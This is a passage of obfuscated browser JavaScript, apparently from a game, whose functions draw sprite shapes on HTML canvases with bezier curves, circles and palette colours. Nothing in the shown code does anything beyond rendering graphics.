				Δ.bezierCurveTo(13 * ᐃ, 208 * ᐃ, ᐃ * ᐃⵠⵠⵠΔ, 202 * ᐃ, ⵠᐃᐃΔⲆ * ᐃ, ᐃ * 193);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 121, 190 * ᐃ);
				Δ.bezierCurveTo(129 * ᐃ, ᐃ * 186, ᐃ * 137, ᐃ * 183, ᐃ * 135, ᐃ * 163);
				Δ.bezierCurveTo(131 * ᐃ, ᐃ * 135, 153 * ᐃ, 127 * ᐃ, ᐃ * 177, 124 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 198, 120 * ᐃ, ᐃ * 208, ᐃ * 122, ᐃ * 226, ᐃ * 128);
				Δ.bezierCurveTo(261 * ᐃ, ᐃ * 112, 271 * ᐃ, 126 * ᐃ, 287 * ᐃ, 147 * ᐃ);
				Δ.bezierCurveTo(310 * ᐃ, 163 * ᐃ, 304 * ᐃ, 183 * ᐃ, 283 * ᐃ, ᐃ * 196);
				Δ.bezierCurveTo(ᐃ * 296, ᐃ * 249, 278 * ᐃ, ᐃ * 262, 253 * ᐃ, ᐃ * 263);
				Δ.bezierCurveTo(210 * ᐃ, 264 * ᐃ, ᐃ * 188, 252 * ᐃ, 177 * ᐃ, ᐃ * 234);
				Δ.bezierCurveTo(ᐃ * 133, ᐃ * 242, 123 * ᐃ, 241 * ᐃ, 115 * ᐃ, ᐃ * 225);
				Δ.bezierCurveTo(109 * ᐃ, 206 * ᐃ, ᐃ * 115, 193 * ᐃ, 121 * ᐃ, 190 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔΔᐃⲆ];
				Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
				Δ.moveTo(335 * ᐃ, ᐃ * 196);
				Δ.bezierCurveTo(312 * ᐃ, 208 * ᐃ, 300 * ᐃ, 185 * ᐃ, ᐃ * 309, ᐃ * 167);
				Δ.bezierCurveTo(ᐃ * 314, 141 * ᐃ, 339 * ᐃ, 127 * ᐃ, ᐃ * 359, 144 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 363, 148 * ᐃ, 364 * ᐃ, 150 * ᐃ, ᐃ * 364, 150 * ᐃ);
				Δ.bezierCurveTo(392 * ᐃ, 143 * ᐃ, ᐃ * 396, ᐃ * 183, 378 * ᐃ, 204 * ᐃ);
				Δ.bezierCurveTo(367 * ᐃ, 215 * ᐃ, ᐃ * 339, ᐃ * 208, ᐃ * 335, 196 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
				Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
				Δ.moveTo(ᐃ * 349, 212 * ᐃ);
				Δ.bezierCurveTo(339 * ᐃ, 216 * ᐃ, ᐃ * 334, 208 * ᐃ, 341 * ᐃ, 203 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 353, ᐃ * 198, ᐃ * 361, 205 * ᐃ, 349 * ᐃ, 212 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔⲆΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 46, 165 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 55, ᐃ * 148, ᐃ * 85, ᐃ * 157, 83 * ᐃ, ᐃ * 175);
				Δ.bezierCurveTo(99 * ᐃ, ᐃ * 185, ᐃ * 89, 212 * ᐃ, ᐃ * 66, 204 * ᐃ);
				Δ.bezierCurveTo(55 * ᐃ, ᐃ * 212, ᐃ * 43, ᐃ * 212, ᐃ * 41, 202 * ᐃ);
				Δ.bezierCurveTo(39 * ᐃ, ᐃ * 194, 42 * ᐃ, ᐃ * 187, ᐃ * 49, 185 * ᐃ);
				Δ.bezierCurveTo(44 * ᐃ, ᐃ * 175, ᐃ * 45, ᐃ * 172, 46 * ᐃ, ᐃ * 165);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠᐃ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[ᐃΔΔΔ];
				Δ.moveTo(219 * ᐃ, 144 * ᐃ);
				Δ.bezierCurveTo(251 * ᐃ, 121 * ᐃ, ᐃ * 277, ᐃ * 136, 276 * ᐃ, ᐃ * 159);
				Δ.bezierCurveTo(276 * ᐃ, ᐃ * 176, 273 * ᐃ, ᐃ * 191, 242 * ᐃ, 193 * ᐃ);
				Δ.bezierCurveTo(226 * ᐃ, ᐃ * 228, ᐃ * 155, 219 * ᐃ, ᐃ * 150, 183 * ᐃ);
				Δ.bezierCurveTo(142 * ᐃ, ᐃ * 144, ᐃ * 174, ᐃ * 127, 219 * ᐃ, 144 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔΔ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔΔᐃⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(123 * ᐃ, ᐃ * 214);
				Δ.bezierCurveTo(119 * ᐃ, ᐃ * 198, 129 * ᐃ, ᐃ * 189, ᐃ * 146, ᐃ * 194);
				Δ.bezierCurveTo(ᐃ * 158, ᐃ * 201, ᐃ * 165, 218 * ᐃ, ᐃ * 147, 226 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 135, 230 * ᐃ, ᐃ * 125, ᐃ * 222, 123 * ᐃ, ᐃ * 214);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⵠ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(257 * ᐃ, 199 * ᐃ);
				Δ.bezierCurveTo(264 * ᐃ, 199 * ᐃ, ᐃ * 275, ᐃ * 213, ᐃ * 261, ᐃ * 220);
				Δ.bezierCurveTo(246 * ᐃ, ᐃ * 225, ᐃ * 235, ᐃ * 200, 257 * ᐃ, ᐃ * 199);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔΔ]);
				Δ.translate(-ᐃⲆⵠⵠ * ᐃ, ᐃ * 55);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 186, ᐃ * 123);
				Δ.bezierCurveTo(198 * ᐃ, ᐃ * 115, 219 * ᐃ, 110 * ᐃ, ᐃ * 219, ᐃ * 123);
				Δ.bezierCurveTo(ᐃ * 216, 135 * ᐃ, ᐃ * 171, 143 * ᐃ, ᐃ * 186, 123 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[5]);
				Δ.translate(ᐃ * ᐃΔΔΔ, -55 * ᐃ);
				Δ.translate(-ⲆΔⲆᐃ * ᐃ, ᐃ * ᐃⲆⵠⵠᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 171, 241 * ᐃ);
				Δ.bezierCurveTo(189 * ᐃ, 234 * ᐃ, 200 * ᐃ, ᐃ * 248, 189 * ᐃ, 254 * ᐃ);
				Δ.bezierCurveTo(179 * ᐃ, ᐃ * 260, 158 * ᐃ, 246 * ᐃ, 171 * ᐃ, 241 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔΔ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
				Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
				Δ.moveTo(ᐃ * 367, ᐃ * 164);
				Δ.bezierCurveTo(ᐃ * 380, 160 * ᐃ, ᐃ * 391, ᐃ * 185, 371 * ᐃ, ᐃ * 189);
				Δ.bezierCurveTo(ᐃ * 362, 192 * ᐃ, ᐃ * 354, ᐃ * 191, ᐃ * 350, ᐃ * 185);
				Δ.bezierCurveTo(326 * ᐃ, ᐃ * 205, ᐃ * 314, 182 * ᐃ, ᐃ * 316, ᐃ * 171);
				Δ.bezierCurveTo(ᐃ * 317, ᐃ * 150, 332 * ᐃ, 143 * ᐃ, 347 * ᐃ, ᐃ * 147);
				Δ.bezierCurveTo(361 * ᐃ, ᐃ * 151, ᐃ * 366, ᐃ * 158, ᐃ * 367, ᐃ * 164);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃΔ])
			}
			return Ⲇⵠ
		}

		function ΔΔⵠⲆⲆⲆⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 40;
			var ⵠⵠᐃ = 40 * ᐃ;
			var ⲆⲆⵠ = ⵠᐃⲆᐃᐃΔⵠ * ᐃ;
			var ⵠⲆⵠ = 4 * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(ᐃⵠⵠ / ᐃⵠⲆⲆⲆ, ⵠⵠᐃ / 2);
			Δ.globalAlpha = ⲆⵠⲆⲆ;
			ⵠᐃᐃ(Δ, ΔⲆⲆ, ᐃⵠΔ, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ], Ⲇᐃ[ᐃᐃⵠ], ⵠⲆⵠ);
			return Ⲇⵠ
		}

		function ⲆΔᐃⲆⵠⲆⵠ(ⵠΔΔᐃⵠᐃᐃ, ΔΔΔⵠΔΔᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = Math.max(ΔΔΔⵠΔΔᐃ.width, ⵠΔΔᐃⵠᐃᐃ.width);
			var ⵠⵠᐃ = Math.max(ΔΔΔⵠΔΔᐃ.height, ⵠΔΔᐃⵠᐃᐃ.height);
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.drawImage(ⵠΔΔᐃⵠᐃᐃ, (ᐃⵠⵠ - ⵠΔΔᐃⵠᐃᐃ.width) / 2, (ⵠⵠᐃ - ⵠΔΔᐃⵠᐃᐃ.height) / 2);
			Δ.drawImage(ΔΔΔⵠΔΔᐃ, (ᐃⵠⵠ - ΔΔΔⵠΔΔᐃ.width) / 2, (ⵠⵠᐃ - ΔΔΔⵠΔΔᐃ.height) / 2);
			return Ⲇⵠ
		}

		function ΔᐃⲆⲆⵠⵠⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 220;
			var ⵠⵠᐃ = ᐃ * 220;
			var ⲆⲆⵠ = ΔⵠΔᐃᐃ * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, 0, 0, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ]);
			Δ.globalAlpha = 1;
			return Ⲇⵠ
		}

		function ⲆᐃΔⵠⲆΔΔ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 283 * ᐃ;
			Ⲇⵠ.height = 224 * ᐃ;
			Δ.translate(0, ᐃ * 15);
			Δ.globalAlpha = .5;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 93, 55 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 127, 27 * ᐃ, ᐃ * 195, 42 * ᐃ, ᐃ * 213, ᐃ * 78);
			Δ.bezierCurveTo(254 * ᐃ, ᐃ * 134, 226 * ᐃ, ᐃ * 198, 153 * ᐃ, ᐃ * 197);
			Δ.bezierCurveTo(ᐃ * 59, ᐃ * 204, 56 * ᐃ, ᐃ * 158, 51 * ᐃ, ᐃ * 115);
			Δ.bezierCurveTo(ᐃ * 50, ᐃ * 93, ᐃ * 81, ᐃ * 62, 90 * ᐃ, 57 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ⵠᐃᐃᐃᐃΔⵠ * ᐃ, 33 * ᐃ);
			Δ.bezierCurveTo(85 * ᐃ, 62 * ᐃ, ᐃ * 102, 66 * ᐃ, ᐃ * 110, ᐃ * 83);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 181, ᐃ * 32);
			Δ.bezierCurveTo(196 * ᐃ, ᐃ * 62, ᐃ * 181, 68 * ᐃ, ᐃ * 178, ᐃ * 69);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 225, 52 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 228, 78 * ᐃ, ᐃ * 207, 77 * ᐃ, ᐃ * 192, 88 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 34, 134 * ᐃ);
			Δ.bezierCurveTo(46 * ᐃ, ᐃ * 111, ᐃ * 57, 111 * ᐃ, ᐃ * 79, 109 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(249 * ᐃ, 135 * ᐃ);
			Δ.bezierCurveTo(233 * ᐃ, ᐃ * 107, 212 * ᐃ, ᐃ * 112, 202 * ᐃ, 115 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(56 * ᐃ, 50 * ᐃ);
			Δ.bezierCurveTo(56 * ᐃ, ᐃ * 82, ᐃ * 73, 82 * ᐃ, ᐃ * 93, ᐃ * 89);
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.translate(ᐃⵠΔ, -ⵠⲆΔⲆᐃᐃⲆ * ᐃ);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * ᐃᐃᐃⲆⲆᐃⲆ, ᐃ * 33);
			Δ.bezierCurveTo(85 * ᐃ, ᐃ * 62, ᐃ * 102, ᐃ * 66, ᐃ * 110, ᐃ * 83);
			ΔⲆ(Δ, undefined, Ⲇᐃ[2], 40 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 181, ᐃ * 32);
			Δ.bezierCurveTo(196 * ᐃ, ᐃ * 62, ᐃ * 181, ᐃ * 68, 178 * ᐃ, 69 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[2], 40 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(225 * ᐃ, 52 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 228, ᐃ * 78, 207 * ᐃ, ᐃ * 77, ᐃ * 192, ᐃ * 88);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⵠⵠΔ], 40 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(34 * ᐃ, ᐃ * 134);
			Δ.bezierCurveTo(46 * ᐃ, 111 * ᐃ, 57 * ᐃ, 111 * ᐃ, ᐃ * 79, 109 * ᐃ);
			ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[ᐃⲆⵠᐃ], 40 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(249 * ᐃ, 135 * ᐃ);
			Δ.bezierCurveTo(233 * ᐃ, 107 * ᐃ, 212 * ᐃ, 112 * ᐃ, ᐃ * 202, 115 * ᐃ);
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[Ⲇⵠⵠᐃ], ᐃ * 40);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(56 * ᐃ, ᐃ * 50);
			Δ.bezierCurveTo(56 * ᐃ, 82 * ᐃ, 73 * ᐃ, 82 * ᐃ, 93 * ᐃ, ᐃ * 89);
			ΔⲆ(Δ, ⵠᐃⵠⲆΔ, Ⲇᐃ[2], 40 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(93 * ᐃ, ᐃ * 55);
			Δ.bezierCurveTo(127 * ᐃ, 27 * ᐃ, ᐃ * 195, 42 * ᐃ, ᐃ * 213, ᐃ * 78);
			Δ.bezierCurveTo(254 * ᐃ, ᐃ * 134, ᐃ * 226, ᐃ * 198, 153 * ᐃ, ᐃ * 197);
			Δ.bezierCurveTo(59 * ᐃ, ᐃ * 204, ᐃ * 56, ᐃ * 158, ᐃ * 51, 115 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 50, ᐃ * 93, ᐃ * 81, 62 * ᐃ, ᐃ * 90, ᐃ * 57);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δⵠⵠⵠ], ᐃ * ⲆⲆᐃΔΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * ⲆᐃⵠΔΔⲆⲆ, ᐃ * 33);
			Δ.bezierCurveTo(ᐃ * 85, 62 * ᐃ, ᐃ * 102, 66 * ᐃ, 110 * ᐃ, 83 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⵠΔⵠ], ᐃ * ⵠᐃΔᐃᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 181, 32 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 196, 62 * ᐃ, 181 * ᐃ, ᐃ * 68, ᐃ * 178, 69 * ᐃ);
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[ΔⵠΔⵠ], ᐃ * Δⵠᐃᐃᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(225 * ᐃ, 52 * ᐃ);
			Δ.bezierCurveTo(228 * ᐃ, ᐃ * 78, 207 * ᐃ, 77 * ᐃ, ᐃ * 192, 88 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⲆΔ], 20 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 34, 134 * ᐃ);
			Δ.bezierCurveTo(46 * ᐃ, 111 * ᐃ, ᐃ * 57, 111 * ᐃ, ᐃ * 79, 109 * ᐃ);
			ΔⲆ(Δ, ⲆΔⵠⲆⵠ, Ⲇᐃ[ΔⲆᐃᐃ], ᐃⲆᐃΔⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(249 * ᐃ, ᐃ * 135);
			Δ.bezierCurveTo(ᐃ * 233, ᐃ * 107, ᐃ * 212, ᐃ * 112, 202 * ᐃ, 115 * ᐃ);
			ΔⲆ(Δ, ⲆΔⵠⲆⵠ, Ⲇᐃ[Ⲇᐃⵠ], ᐃ * ⵠᐃΔᐃᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 56, ᐃ * 50);
			Δ.bezierCurveTo(ᐃ * 56, ᐃ * 82, 73 * ᐃ, 82 * ᐃ, 93 * ᐃ, ᐃ * 89);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠΔΔ], ᐃ * 20);
			ⵠᐃᐃ(Δ, ᐃ * 101, 155 * ᐃ, 20.591260281974 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[3]);
			ⵠᐃᐃ(Δ, ᐃ * 180, ᐃ * 155, 20.591260281974 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⵠ]);
			ⵠᐃᐃ(Δ, 95 * ᐃ, ᐃ * 148, ᐃ * 7.211102550927978);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, ᐃ * 173, 148 * ᐃ, ᐃ * 7.211102550927978);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ᐃΔᐃⲆ === ⵠᐃ && (Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(191 * ᐃ, 107 * ᐃ), Δ.bezierCurveTo(ᐃ * 180, 104 * ᐃ, 175 * ᐃ, 101 * ᐃ, 180 * ᐃ, ᐃ * 95), Δ.bezierCurveTo(ᐃ * 180, ᐃ * 95, 181 * ᐃ, 99 * ᐃ, ᐃ * 188, 103 * ᐃ), Δ.bezierCurveTo(ᐃ * 191, 101 * ᐃ, 191 * ᐃ, 95 * ᐃ, 190 * ᐃ, ᐃ * 91), Δ.bezierCurveTo(190 * ᐃ, 91 * ᐃ, ᐃ * 196, ᐃ * 89, 195 * ᐃ, 99 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[Ⲇⵠⵠᐃ]), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(206 * ᐃ, ᐃ * 98), Δ.bezierCurveTo(203 * ᐃ, ᐃ * 95, ᐃ * 200, 93 * ᐃ, ᐃ * 198, 101 * ᐃ), Δ.bezierCurveTo(ᐃ * 194, 109 * ᐃ, 193 * ᐃ, ᐃ * 109, 196 * ᐃ, ᐃ * 110), Δ.bezierCurveTo(206 * ᐃ, 115 * ᐃ, ᐃ * 209, 114 * ᐃ, 211 * ᐃ, 111 * ᐃ), Δ.bezierCurveTo(ᐃ * 211, 106 * ᐃ, 208 * ᐃ, 108 * ᐃ, 203 * ᐃ, ᐃ * 108), Δ.bezierCurveTo(ᐃ * 193, 107 * ᐃ, 204 * ᐃ, 101 * ᐃ, 206 * ᐃ, 99 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⲆ]), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(172 * ᐃ, 111 * ᐃ), Δ.bezierCurveTo(ᐃ * 172, 106 * ᐃ, ᐃ * 174, 105 * ᐃ, 185 * ᐃ, ᐃ * 109), Δ.bezierCurveTo(ᐃ * 190, 109 * ᐃ, 189 * ᐃ, 114 * ᐃ, 185 * ᐃ, ᐃ * 120), Δ.bezierCurveTo(181 * ᐃ, ᐃ * 125, 180 * ᐃ, ᐃ * 126, 176 * ᐃ, ᐃ * 122), Δ.bezierCurveTo(182 * ᐃ, 119 * ᐃ, ᐃ * 187, ᐃ * 110, 182 * ᐃ, 112 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ⲆΔΔⵠ]), Δ.beginPath(), Δ.lineCap = ⵠ[ΔΔᐃⲆ], Δ.lineJoin = ⵠ[5], Δ.moveTo(202 * ᐃ, ᐃ * 125), Δ.bezierCurveTo(ᐃ * 197, ᐃ * 117, ᐃ * 193, 116 * ᐃ, ᐃ * 193, 120 * ᐃ), Δ.bezierCurveTo(192.5 * ᐃ, 124.5 * ᐃ, ᐃ * 192.5, 124.5 * ᐃ, ᐃ * 192, 129 * ᐃ), Δ.bezierCurveTo(ᐃ * 188, 129 * ᐃ, 187 * ᐃ, ᐃ * 124, ᐃ * 189, 120 * ᐃ), Δ.bezierCurveTo(191 * ᐃ, ᐃ * 110, 192 * ᐃ, 110 * ᐃ, ᐃ * 200, 116 * ᐃ), Δ.bezierCurveTo(208 * ᐃ, 120 * ᐃ, 207 * ᐃ, ᐃ * 123, ᐃ * 202, ᐃ * 125), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔΔΔ]));
			return Ⲇⵠ
		}

		function ᐃᐃΔⵠⵠⲆⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 100 * ᐃ;
			Ⲇⵠ.height = ᐃ * 250;
			Δ.translate(-135 * ᐃ, -75 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .8 : ⵠΔᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(178.5 * ᐃ, ᐃ * 238.03125);
			Δ.bezierCurveTo(ᐃ * 177, 175.03125 * ᐃ, 177 * ᐃ, 175.03125 * ᐃ, 175.5 * ᐃ, 112.03125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 184.5, 100.53125 * ᐃ, ᐃ * 184.5, ᐃ * 100.53125, ᐃ * 193.5, 89.03125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 202, ᐃ * 100.03125, ᐃ * 202, ᐃ * 100.03125, 210.5 * ᐃ, ᐃ * 111.03125);
			Δ.bezierCurveTo(ᐃ * 209.5, ᐃ * 174.03125, 209.5 * ᐃ, ᐃ * 174.03125, ᐃ * 208.5, 237.03125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 155.5, ᐃ * 239.03125);
			Δ.bezierCurveTo(ᐃ * 194, ᐃ * 238.53125, ᐃ * 194, ᐃ * 238.53125, ᐃ * 232.5, ᐃ * 238.03125);
			Δ.bezierCurveTo(232.5 * ᐃ, 243.03125 * ᐃ, 232.5 * ᐃ, ᐃ * 243.03125, 232.5 * ᐃ, 248.03125 * ᐃ);
			Δ.bezierCurveTo(194 * ᐃ, ᐃ * 248.53125, 194 * ᐃ, ᐃ * 248.53125, ᐃ * 155.5, 249.03125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃᐃ]);
			ⵠᐃᐃ(Δ, ᐃ * 160.5, 243.03125 * ᐃ, 7 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ]);
			ⵠᐃᐃ(Δ, 227.5 * ᐃ, ᐃ * 242.03125, ᐃ * 7);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 185.5, ᐃ * 253.03125);
			Δ.bezierCurveTo(193.5 * ᐃ, 253.03125 * ᐃ, 193.5 * ᐃ, ᐃ * 253.03125, 201.5 * ᐃ, 253.03125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 201.5, 276.03125 * ᐃ, 201.5 * ᐃ, 276.03125 * ᐃ, ᐃ * 201.5, ᐃ * 299.03125);
			Δ.bezierCurveTo(ᐃ * 194.5, ᐃ * 299.03125, 194.5 * ᐃ, 299.03125 * ᐃ, 187.5 * ᐃ, ᐃ * 299.03125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ], Ⲇᐃ[ΔΔⵠ], ΔᐃΔⲆ * ᐃ);
			ⵠᐃᐃ(Δ, 194 * ᐃ, ᐃ * 298, 9 * ᐃ);
